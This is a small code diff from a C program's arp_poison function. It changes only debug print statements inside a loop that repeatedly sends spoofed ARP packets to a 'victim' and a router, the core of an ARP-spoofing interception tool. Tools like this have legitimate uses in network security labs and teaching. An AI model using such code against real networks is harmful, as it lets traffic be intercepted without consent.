@@ -40,14 +40,12 @@ void arp_poison(struct config *c)
     memcpy(interface.ifr_name, conf->interfaceName, HARDWARE_LEN);
     fillSLL(&device, &interface, &sd);
 
-    printf("Size: %d\n ", packet_size);
-
     while (1)
     {
         sendto(sd, to_victim, packet_size, 0, (struct sockaddr *)&device, sizeof(struct sockaddr_ll));
         sendto(sd, to_router, packet_size, 0, (struct sockaddr *)&device, sizeof(struct sockaddr_ll));
         sleep(1);
-        fprintf(stdout, "ARP\n");
+        printf("arp..\n");
     }
 }
 
